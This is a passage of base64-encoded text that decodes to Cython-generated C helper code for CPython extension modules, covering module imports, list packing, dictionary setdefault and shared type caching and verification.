C0+dHBfZmxhZ3MgfD0gUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFO1xuI2VuZGlmXG4jZWxzZVxuICAgICAgICAodm9pZClfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMDtcbiNlbmRpZlxuICAgIHIgPSBQeVR5cGVfUmVhZHkodCk7XG4jaWYgIWRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pXG4gICAgICAgIHQtPnRwX2ZsYWdzICY9IH5QeV9UUEZMQUdTX0hFQVBUWVBFO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMGIxXG4gICAgICAgIGlmIChnY193YXNfZW5hYmxlZClcbiAgICAgICAgICAgIFB5R0NfRW5hYmxlKCk7XG4gICAgI2Vsc2VcbiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdHAsICp2LCAqdGI7XG4gICAgICAgICAgICBQeUVycl9GZXRjaCgmdHAsICZ2LCAmdGIpO1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5hYmxlKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkocmV0IHx8IHIgPT0gLTEpKSB7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRihyZXQpO1xuICAgICAgICAgICAgICAgIFB5RXJyX1Jlc3RvcmUodHAsIHYsIHRiKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0cCk7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih2KTtcbiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRiKTtcbiAgICAgICAgICAgICAgICByID0gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAjZW5kaWZcbiAgICB9XG4jZW5kaWZcbiAgICByZXR1cm4gcjtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlMaXN0X1BhY2soUHlfc3NpemVfdCBuLCAuLi4pIHtcbiAgICB2YV9saXN0IHZhO1xuICAgIFB5T2JqZWN0ICpsID0gUHlMaXN0X05ldyhuKTtcbiAgICB2YV9zdGFydCh2YSwgbik7XG4gICAgaWYgKHVubGlrZWx5KCFsKSkgZ290byBlbmQ7XG4gICAgZm9yIChQeV9zc2l6ZV90IGk9MDsgaTxuOyArK2kpIHtcbiAgICAgICAgUHlPYmplY3QgKmFyZyA9IHZhX2FyZyh2YSwgUHlPYmplY3QqKTtcbiAgICAgICAgUHlfSU5DUkVGKGFyZyk7XG4gICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0obCwgaSwgYXJnKSAhPSAoMCkpIHtcbiAgICAgICAgICAgIFB5X0NMRUFSKGwpO1xuICAgICAgICAgICAgZ290byBlbmQ7XG4gICAgICAgIH1cbiAgICB9XG4gICAgZW5kOlxuICAgIHZhX2VuZCh2YSk7XG4gICAgcmV0dXJuIGw7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnQoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpmcm9tX2xpc3QsIGludCBsZXZlbCkge1xuICAgIFB5T2JqZWN0ICptb2R1bGUgPSAwO1xuICAgIFB5T2JqZWN0ICplbXB0eV9kaWN0ID0gMDtcbiAgICBQeU9iamVjdCAqZW1wdHlfbGlzdCA9IDA7XG4gICAgZW1wdHlfZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICBpZiAodW5saWtlbHkoIWVtcHR5X2RpY3QpKVxuICAgICAgICBnb3RvIGJhZDtcbiAgICBpZiAobGV2ZWwgPT0gLTEpIHtcbiAgICAgICAgY29uc3QgY2hhciogcGFja2FnZV9zZXAgPSBzdHJjaHIoX19QeXhfTU9EVUxFX05BTUUsIFwnLlwnKTtcbiAgICAgICAgaWYgKHBhY2thZ2Vfc2VwICE9ICgwKSkge1xuICAgICAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoXG4gICAgICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCAxKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkge1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19JbXBvcnRFcnJvcikpKVxuICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGxldmVsID0gMDtcbiAgICB9XG4gICAgaWYgKCFtb2R1bGUpIHtcbiAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoXG4gICAgICAgICAgICBuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBlbXB0eV9kaWN0LCBmcm9tX2xpc3QsIGxldmVsKTtcbiAgICB9XG5iYWQ6XG4gICAgUHlfWERFQ1JFRihlbXB0eV9kaWN0KTtcbiAgICBQeV9YREVDUkVGKGVtcHR5X2xpc3QpO1xuICAgIHJldHVybiBtb2R1bGU7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGcm9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKSB7XG4gICAgUHlPYmplY3QqIHZhbHVlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihtb2R1bGUsIG5hbWUpO1xuICAgIGlmICh1bmxpa2VseSghdmFsdWUpICYmIFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSB7XG4gICAgICAgIGNvbnN0IGNoYXIqIG1vZHVsZV9uYW1lX3N0ciA9IDA7XG4gICAgICAgIFB5T2JqZWN0KiBtb2R1bGVfbmFtZSA9IDA7XG4gICAgICAgIFB5T2JqZWN0KiBtb2R1bGVfZG90ID0gMDtcbiAgICAgICAgUHlPYmplY3QqIGZ1bGxfbmFtZSA9IDA7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIG1vZHVsZV9uYW1lX3N0ciA9IFB5TW9kdWxlX0dldE5hbWUobW9kdWxlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZV9zdHIpKSB7IGdvdG8gbW9kYmFkOyB9XG4gICAgICAgIG1vZHVsZV9uYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobW9kdWxlX25hbWVfc3RyKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZSkpIHsgZ290byBtb2RiYWQ7IH1cbiAgICAgICAgbW9kdWxlX2RvdCA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzQpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9kb3QpKSB7IGdvdG8gbW9kYmFkOyB9XG4gICAgICAgIGZ1bGxfbmFtZSA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX2RvdCwgbmFtZSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZnVsbF9uYW1lKSkgeyBnb3RvIG1vZGJhZDsgfVxuICAgICAgICAjaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWVBZX1ZFUlNJT05fTlVNICA8IDB4MDcwMzA0MDApIHx8XFxcbiAgICAgICAgICAgICAgICBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSlcbiAgICAgICAgICAgICAgICBnb3RvIG1vZGJhZDtcbiAgICAgICAgICAgIHZhbHVlID0gUHlPYmplY3RfR2V0SXRlbShtb2R1bGVzLCBmdWxsX25hbWUpO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgIHZhbHVlID0gUHlJbXBvcnRfR2V0TW9kdWxlKGZ1bGxfbmFtZSk7XG4gICAgICAgICNlbmRpZlxuICAgICAgbW9kYmFkOlxuICAgICAgICBQeV9YREVDUkVGKGZ1bGxfbmFtZSk7XG4gICAgICAgIFB5X1hERUNSRUYobW9kdWxlX2RvdCk7XG4gICAgICAgIFB5X1hERUNSRUYobW9kdWxlX25hbWUpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkge1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfSW1wb3J0RXJyb3IsICJjYW5ub3QgaW1wb3J0IG5hbWUgJVMiLCBuYW1lKTtcbiAgICB9XG4gICAgcmV0dXJuIHZhbHVlO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlLCBQeV9zc2l6ZV90IGNvdW50KSB7XG4gICAgUHlPYmplY3QgKnBhcnRpYWxfbmFtZSA9IE5VTEwsICpzbGljZSA9IE5VTEwsICpzZXAgPSBOVUxMO1xuICAgIFB5X3NzaXplX3Qgc2l6ZTtcbiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICB9XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShwYXJ0c190dXBsZSk7XG4jZWxzZVxuICAgIHNpemUgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpO1xuICAgIGlmIChzaXplIDwgMCkgZ290byBiYWQ7XG4jZW5kaWZcbiAgICBpZiAobGlrZWx5KHNpemUgPT0gY291bnQpKSB7XG4gICAgICAgIHBhcnRpYWxfbmFtZSA9IG5hbWU7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgc2xpY2UgPSBQeVNlcXVlbmNlX0dldFNsaWNlKHBhcnRzX3R1cGxlLCAwLCBjb3VudCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2xpY2UpKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIHNlcCA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZSgiLiIsIDEpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlcCkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgcGFydGlhbF9uYW1lID0gUHlVbmljb2RlX0pvaW4oc2VwLCBzbGljZSk7XG4gICAgfVxuICAgIFB5RXJyX0Zvcm1hdChcbiAgICAgICAgUHlFeGNfTW9kdWxlTm90Rm91bmRFcnJvcixcbiAgICAgICAgIk5vIG1vZHVsZSBuYW1lZCBcJyVVXCciLCBwYXJ0aWFsX25hbWUpO1xuYmFkOlxuICAgIFB5X1hERUNSRUYoc2VwKTtcbiAgICBQeV9YREVDUkVGKHNsaWNlKTtcbiAgICBQeV9YREVDUkVGKHBhcnRpYWxfbmFtZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKFB5T2JqZWN0ICpuYW1lKSB7XG4gICAgUHlPYmplY3QgKmltcG9ydGVkX21vZHVsZTtcbiNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZUFlfVkVSU0lPTl9OVU0gIDwgMHgwNzAzMDQwMCkgfHxcXFxuICAgICAgICBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7XG4gICAgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgaW1wb3J0ZWRfbW9kdWxlID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIobW9kdWxlcywgbmFtZSk7XG4gICAgUHlfWElOQ1JFRihpbXBvcnRlZF9tb2R1bGUpO1xuI2Vsc2VcbiAgICBpbXBvcnRlZF9tb2R1bGUgPSBQeUltcG9ydF9HZXRNb2R1bGUobmFtZSk7XG4jZW5kaWZcbiAgICByZXR1cm4gaW1wb3J0ZWRfbW9kdWxlO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGVfV2Fsa1BhcnRzKFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHtcbiAgICBQeV9zc2l6ZV90IGksIG5wYXJ0cztcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIG5wYXJ0cyA9IFB5VHVwbGVfR0VUX1NJWkUocGFydHNfdHVwbGUpO1xuI2Vsc2VcbiAgICBucGFydHMgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpO1xuICAgIGlmIChucGFydHMgPCAwKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgIGZvciAoaT0xOyBpIDwgbnBhcnRzICYmIG1vZHVsZTsgaSsrKSB7XG4gICAgICAgIFB5T2JqZWN0ICpwYXJ0LCAqc3VibW9kdWxlO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIHBhcnQgPSBQeVR1cGxlX0dFVF9JVEVNKHBhcnRzX3R1cGxlLCBpKTtcbiNlbHNlXG4gICAgICAgIHBhcnQgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0ocGFydHNfdHVwbGUsIGkpO1xuICAgICAgICBpZiAoIXBhcnQpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgICAgIHN1Ym1vZHVsZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG1vZHVsZSwgcGFydCk7XG4jaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUylcbiAgICAgICAgUHlfREVDUkVGKHBhcnQpO1xuI2VuZGlmXG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgICAgICBtb2R1bGUgPSBzdWJtb2R1bGU7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihuYW1lLCBwYXJ0c190dXBsZSwgaSk7XG4gICAgfVxuICAgIHJldHVybiBtb2R1bGU7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGUoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSkge1xuICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IF9fUHl4X0ltcG9ydChuYW1lLCBOVUxMLCAwKTtcbiAgICBpZiAoIXBhcnRzX3R1cGxlIHx8IHVubGlrZWx5KCFtb2R1bGUpKVxuICAgICAgICByZXR1cm4gbW9kdWxlO1xuICAgIGltcG9ydGVkX21vZHVsZSA9IF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKG5hbWUpO1xuICAgIGlmIChsaWtlbHkoaW1wb3J0ZWRfbW9kdWxlKSkge1xuICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTtcbiAgICAgICAgcmV0dXJuIGltcG9ydGVkX21vZHVsZTtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiAgICByZXR1cm4gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhtb2R1bGUsIG5hbWUsIHBhcnRzX3R1cGxlKTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBQeU9iamVjdCAqbW9kdWxlID0gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAobmFtZSk7XG4gICAgaWYgKGxpa2VseShtb2R1bGUpKSB7XG4gICAgICAgIFB5T2JqZWN0ICpzcGVjID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobW9kdWxlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BlYyk7XG4gICAgICAgIGlmIChsaWtlbHkoc3BlYykpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp1bnNhZmUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihzcGVjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5pdGlhbGl6aW5nKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkoIXVuc2FmZSB8fCAhX19QeXhfUHlPYmplY3RfSXNUcnVlKHVuc2FmZSkpKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHNwZWMpO1xuICAgICAgICAgICAgICAgIHNwZWMgPSBOVUxMO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgUHlfWERFQ1JFRih1bnNhZmUpO1xuICAgICAgICB9XG4gICAgICAgIGlmIChsaWtlbHkoIXNwZWMpKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICAgcmV0dXJuIG1vZHVsZTtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoc3BlYyk7XG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgIH0gZWxzZSBpZiAoUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlKG5hbWUsIHBhcnRzX3R1cGxlKTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ZldGNoU2hhcmVkQ3l0aG9uQUJJTW9kdWxlKHZvaWQpIHtcbiAgICByZXR1cm4gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUFlYX0FCSV9NT0RVTEVfTkFNRSk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9TZXREZWZhdWx0KFB5T2JqZWN0ICpkLCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqZGVmYXVsdF92YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaXNfc2FmZV90eXBlKSB7XG4gICAgUHlPYmplY3QqIHZhbHVlO1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlzX3NhZmVfdHlwZSk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHZhbHVlID0gUHlPYmplY3RfQ2FsbE1ldGhvZChkLCAic2V0ZGVmYXVsdCIsICJPTyIsIGtleSwgZGVmYXVsdF92YWx1ZSk7XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgUHlEaWN0X1NldERlZmF1bHRSZWYoZCwga2V5LCBkZWZhdWx0X3ZhbHVlLCAmdmFsdWUpO1xuI2Vsc2VcbiAgICB2YWx1ZSA9IFB5RGljdF9TZXREZWZhdWx0KGQsIGtleSwgZGVmYXVsdF92YWx1ZSk7XG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHJldHVybiBOVUxMO1xuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4jZW5kaWZcbiAgICByZXR1cm4gdmFsdWU7XG59XG5cblxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VHlwZV9Gcm9tTWV0YWNsYXNzKFB5VHlwZU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqbW9kdWxlLCBQeVR5cGVfU3BlYyAqc3BlYywgUHlPYmplY3QgKmJhc2VzKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtb2R1bGUsIHNwZWMsIGJhc2VzKTtcbiAgICBpZiAocmVzdWx0ICYmIG1ldGFjbGFzcykge1xuICAgICAgICBQeU9iamVjdCAqb2xkX3RwID0gKFB5T2JqZWN0KilQeV9UWVBFKHJlc3VsdCk7XG4gICAgUHlfSU5DUkVGKChQeU9iamVjdCopbWV0YWNsYXNzKTtcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiAgICAgICAgUHlfU0VUX1RZUEUocmVzdWx0LCBtZXRhY2xhc3MpO1xuI2Vsc2VcbiAgICAgICAgcmVzdWx0LT5vYl90eXBlID0gbWV0YWNsYXNzO1xuI2VuZGlmXG4gICAgICAgIFB5X0RFQ1JFRihvbGRfdHApO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MobWUsIG1vLCBzLCBiKSBQeVR5cGVfRnJvbU1ldGFjbGFzcyhtZSwgbW8sIHMsIGIpXG4jZW5kaWZcbnN0YXRpYyBpbnQgX19QeXhfVmVyaWZ5Q2FjaGVkVHlwZShQeU9iamVjdCAqY2FjaGVkX3R5cGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgY2hhciAqbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGV4cGVjdGVkX2Jhc2ljc2l6ZSkge1xuICAgIFB5X3NzaXplX3QgYmFzaWNzaXplO1xuICAgIGlmICghUHlUeXBlX0NoZWNrKGNhY2hlZF90eXBlKSkge1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaXMgbm90IGEgdHlwZSBvYmplY3QiLCBuYW1lKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBpZiAoZXhwZWN0ZWRfYmFzaWNzaXplID09IDApIHtcbiAgICAgICAgcmV0dXJuIDA7IC8vIHNpemUgaXMgaW5oZXJpdGVkLCBub3RoaW5nIHVzZWZ1bCB0byBjaGVja1xuICAgIH1cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKnB5X2Jhc2ljc2l6ZTtcbiAgICBweV9iYXNpY3NpemUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKGNhY2hlZF90eXBlLCAiX19iYXNpY3NpemVfXyIpO1xuICAgIGlmICh1bmxpa2VseSghcHlfYmFzaWNzaXplKSkgcmV0dXJuIC0xO1xuICAgIGJhc2ljc2l6ZSA9IFB5TG9uZ19Bc1NzaXplX3QocHlfYmFzaWNzaXplKTtcbiAgICBQeV9ERUNSRUYocHlfYmFzaWNzaXplKTtcbiAgICBweV9iYXNpY3NpemUgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShiYXNpY3NpemUgPT0gKFB5X3NzaXplX3QpLTEpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiAtMTtcbiNlbHNlXG4gICAgYmFzaWNzaXplID0gKChQeVR5cGVPYmplY3QqKSBjYWNoZWRfdHlwZSktPnRwX2Jhc2ljc2l6ZTtcbiNlbmRpZlxuICAgIGlmIChiYXNpY3NpemUgIT0gZXhwZWN0ZWRfYmFzaWNzaXplKSB7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAiU2hhcmVkIEN5dGhvbiB0eXBlICUuMjAwcyBoYXMgdGhlIHdyb25nIHNpemUsIHRyeSByZWNvbXBpbGluZyIsXG4gICAgICAgICAgICBuYW1lKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeVR5cGVPYmplY3QgKl9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKFB5VHlwZU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqbW9kdWxlLCBQeVR5cGVfU3BlYyAqc3BlYywgUHlPYmplY3QgKmJhc2VzKSB7XG4gICAgUHlPYmplY3QgKmFiaV9tb2R1bGUgPSBOVUxMLCAqY2FjaGVkX3R5cGUgPSBOVUxMLCAqYWJpX21vZHVsZV9kaWN0LCAqbmV3X2NhY2hlZF90eXBlLCAqcHlfb2JqZWN0X25hbWU7XG4gICAgaW50IGdldF9pdGVtX3JlZl9yZXN1bHQ7XG4gICAgY29uc3QgY2hhciogb2JqZWN0X25hbWUgPSBzdHJyY2hyKHNwZWMtPm5hbWUsIFwnLlwnKTtcbiAgICBvYmplY3RfbmFtZSA9IG9iamVjdF9uYW1lID8gb2JqZWN0X25hbWUrMSA6IHNwZWMtPm5hbWU7XG4gICAgcHlfb2JqZWN0X25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhvYmplY3RfbmFtZSk7XG4gICAgaWYgKCFweV9vYmplY3RfbmFtZSkgcmV0dXJuIE5VTEw7XG4gICAgYWJpX21vZHVsZSA9IF9fUHl4X0ZldGNoU2hhcmVkQ3l0aG9uQUJJTW9kdWxlKCk7XG4gICAgaWYgKCFhYmlfbW9kdWxlKSBnb3RvIGRvbmU7XG4gICAgYWJpX21vZHVsZV9kaWN0ID0gUHlNb2R1bGVfR2V0RGljdChhYmlfbW9kdWxlKTtcbiAgICBpZiAoIWFiaV9tb2R1bGVfZGljdCkgZ290byBkb25lO1xuICAgIGdldF9pdGVtX3JlZl9yZXN1bHQgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihhYmlfbW9kdWxlX2RpY3QsIHB5X29iamVjdF9uYW1lLCAmY2FjaGVkX3R5cGUpO1xuICAgIGlmIChnZXRfaXRlbV9yZWZfcmVzdWx0ID09IDEpIHtcbiAgICAgICAgaWYgKF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoXG4gICAgICAgICAgICAgIGNhY2hlZF90eXBlLFxuICAgICAgICAgICAgICBvYmplY3RfbmFtZSxcbiAgICAgICAgICAgICAgc3BlYy0+YmFzaWNzaXplKSA8IDApIHtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gZG9uZTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdldF9pdGVtX3JlZl9yZXN1bHQgPT0gLTEpKSB7XG4gICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICBDWVRIT05fVU5VU0VEX1ZBUihtb2R1bGUpO1xuICAgIGNhY2hlZF90eXBlID0gX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MobWV0YWNsYXNzLCBhYmlfbW9kdWxlLCBzcGVjLCBiYXNlcyk7XG4gICAgaWYgKHVubGlrZWx5KCFjYWNoZWRfdHlwZSkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKHNwZWMsIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGUpIDwgMCkpIGdvdG8gYmFkO1xuICAgIG5ld19jYWNoZWRfdHlwZSA9IF9fUHl4X1B5RGljdF9TZXREZWZhdWx0KGFiaV9tb2R1bGVfZGljdCwgcHlfb2JqZWN0X25hbWUsIGNhY2hlZF90eXBlLCAxKTtcbiAgICBpZiAodW5saWtlbHkobmV3X2NhY2hlZF90eXBlICE9IGNhY2hlZF90eXBlKSkge1xuICAgICAgICBpZiAodW5saWtlbHkoIW5ld19jYWNoZWRfdHlwZSkpIGdvdG8gYmFkO1xuICAgICAgICBQeV9ERUNSRUYoY2FjaGVkX3R5cGUpO1xuICAgICAgICBjYWNoZWRfdHlwZSA9IG5ld19jYWNoZWRfdHlwZTtcbiAgICAgICAgaWYgKF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoXG4gICAgICAgICAgICAgICAgY2FjaGVkX3R5cGUsXG4gICAgICAgICAgICAgICAgb2JqZWN0X25hbWUsXG4gICAgICAgICAgICAgICAgc3